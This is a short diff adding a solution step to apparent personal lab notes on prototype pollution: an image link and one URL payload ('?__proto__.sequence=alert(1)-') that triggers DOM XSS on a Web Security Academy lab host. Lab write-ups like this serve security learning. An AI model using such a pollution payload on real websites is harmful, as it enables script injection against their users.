@@ -92,3 +92,9 @@ Placeholder
 
 ### DOM XSS via an alternative prototype pollution vector
 
+![searchLoggerAlternate.js](../attachments/prototype-pollution/image-3.png)
+
+```
+https://0a0c00d404f574ab83fae7a3002500bd.web-security-academy.net/?__proto__.sequence=alert(1)-
+```
+
